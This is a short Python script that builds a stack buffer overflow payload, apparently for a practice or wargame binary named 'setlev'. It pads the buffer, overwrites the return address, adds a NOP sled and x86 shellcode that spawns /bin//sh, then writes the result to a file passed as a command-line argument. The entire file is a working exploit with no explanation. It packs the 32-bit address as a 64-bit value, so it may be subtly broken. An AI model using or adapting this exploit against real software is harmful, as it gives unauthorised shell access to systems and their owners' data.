
from struct import *

buf = "AAAAAAAAAAAA"    # buffer full
buf += pack("<Q", 0xbffff650) #return address 
#buf += "\x50\xf6\xff\xbf"
buf += "\x90"*100           # NOP slide
buf += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # shellcode /bin//sh

f = open("in.txt", "w")
f.write(buf)


#$ ./setlev --level=`cat in.txt`
